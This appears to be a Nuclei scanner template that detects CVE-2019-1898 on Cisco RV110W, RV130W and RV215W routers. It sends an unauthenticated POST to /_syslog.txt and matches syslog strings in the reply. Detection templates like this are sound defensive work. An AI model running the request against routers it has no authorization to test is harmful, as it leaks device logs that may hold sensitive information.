id: cisco-rv-router-syslog-info-leakage
info:
  name: Cisco RV Router Syslog Information Leakage
  author: ProjectDiscoveryAI
  severity: medium
  description: |
    Cisco RV110W, RV130W, and RV215W routers have an authorization issue that allows a remote attacker to read the syslog file of the device. The syslog log may contain sensitive information, threatening the security of the system.
  tags: information-disclosure
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2019-1898
    - https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190619-rv-fileaccess

http:
  - raw:
      - |
        POST /_syslog.txt HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "new AAA"
          - "Ethernet LAN"
